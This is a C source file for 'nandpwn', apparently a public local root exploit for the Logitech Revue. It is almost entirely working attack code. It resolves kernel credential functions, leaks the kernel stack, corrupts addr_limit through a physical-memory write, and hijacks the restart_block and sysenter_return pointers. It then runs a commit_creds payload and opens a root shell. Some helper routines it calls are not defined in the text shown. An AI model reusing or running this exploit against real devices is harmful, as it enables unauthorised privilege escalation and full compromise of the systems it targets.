/*
 * nandpwn
 * Logitech Revue local root exploit
 *
 * Dan Rosenberg (dan.j.rosenberg@gmail.com)
 *
 */

#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <limits.h>
#include <errno.h>
#include <syscall.h>

/* Offset from base of thread_info to addr_limit variable */
#define LIMIT_OFFSET 24

/* Offset from base of thread_info to restart_block fptr */
#define RESTART_OFFSET 28

/* Logitech Revue is 50/50 user/kernel */
#define PAGE_OFFSET 0x80000000

/* Offset in vdso to sysenter return address */
#define VDSO_OFFSET 0x424

typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);
_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;

int fds[2];

/* simple payload */
static int __attribute__((regparm(3))) getroot()
{

	commit_creds(prepare_kernel_cred(0));
	return 0;
}

unsigned long get_kernel_addr(char *name)
{

	FILE *f;
	unsigned long addr;
	char dummy;
	char sname[512];
	int ret;

	f = fopen("/proc/kallsyms", "r");
	if (f == NULL)
		return 0;

	ret = 0;
	while(ret != EOF) {
		ret = fscanf(f, "%p %c %s\n", (void **)&addr, &dummy, sname);
		if (!strcmp(name, sname)) {
			printf("[+] %s resolved to %p\n", name, (void *)addr);
			fclose(f);
			return addr;
		}
	}

	fclose(f);
	return 0;
}

/* We need to use int 0x80 instead of sysenter because we've
 * clobbered the sysenter_return function pointer */
int fake_sys(int sys, int arg1, int arg2, int arg3)
{

	int ret;

        asm(    "movl %1, %%eax;\n"
                "movl %2, %%ebx;\n"
                "movl %3, %%ecx;\n"
                "movl %4, %%edx;\n"
                "int $0x80;\n"
                "movl %%eax, %0;\n"
                : "=r"(ret)
                : "m"(sys), "m"(arg1), "m"(arg2), "m"(arg3)
                : "eax", "ebx", "ecx", "edx");

        return ret;

}

int getprivs(unsigned long kstack, unsigned long vdso)
{

	int ret;
	unsigned long target = kstack + RESTART_OFFSET;
	unsigned long vals[9];

	memset(vals, 0, sizeof(vals));

	vals[0] = (unsigned long)&getroot;
	vals[8] = vdso;

	/* Overwrite restart_block and sysenter_return function
	 * pointers */
	fake_sys(__NR_write, fds[1], (int)&vals, 36);
	fake_sys(__NR_read, fds[0], (int)target, 36);

	printf("[+] Overwrote restart_block with %p\n", &getroot);

	syscall(__NR_restart_syscall, 0, 0);

	printf("[*] Survived restart syscall.\n");

	return 0;

}

int main(int argc, char * argv[])
{

	int ret, i;
	unsigned long phys, kstack, vdso, dummy;
	unsigned long *ptr;
	FILE *maps;
	char buf[256];

	/* Resolve kernel symbols */
	commit_creds = (_commit_creds)get_kernel_addr("commit_creds");
	prepare_kernel_cred = (_prepare_kernel_cred)get_kernel_addr("prepare_kernel_cred");

	maps = fopen("/proc/self/maps", "r");
	if (!maps) {
		printf("[-] Failed to open maps file.\n");
		return -1;
	}

	vdso = 0;

	while(fgets(buf, 256, maps) != NULL) {
                if (strstr(buf, "vdso")) {
                        sscanf(buf, "%lx-%lx", &vdso, &dummy);
                        break;
                }
        }

	fclose(maps);

	if (!vdso) {
		printf("[-] Failed to resolve vdso.\n");
		return -1;
	}

	printf("[*] Resolved vdso to %lx\n", vdso);

	vdso += VDSO_OFFSET;

	/* Setup for our leak */
	ret = setup();

	if(ret < 0) {
		printf("[*] Setup for kstack leak failed.\n");
		return -1;
	}

	/* Get our kernel stack base address using libkstack */
	kstack = get_kstack();
	printf("[*] Kernel stack found at: %lx\n", kstack);

	phys = kstack - PAGE_OFFSET + LIMIT_OFFSET;

	printf("[*] Clobbering physical address %lx\n", phys);
	pipe(fds);

	clobber(phys, rand() % 0x10000);

	/* Spin for a bit to burn some time to let the DMA complete */
	for (i = 0; i < 0x7fffffff; i++) {
		i += 5;
		i -= 5;
	}

	/* Get root */
	ret = getprivs(kstack, vdso);

	if (!getuid()) {

		printf("[+] Got root!\n");

		/* This seems to help... */
		sleep(5);

		execl("/system/bin/sh", "/system/bin/sh", NULL);

		/* Shouldn't reach this... */
		printf("[-] Failed to spawn shell\n");
	}

	printf("[-] Failed to get root. Try again.\n");

	return 1;
}
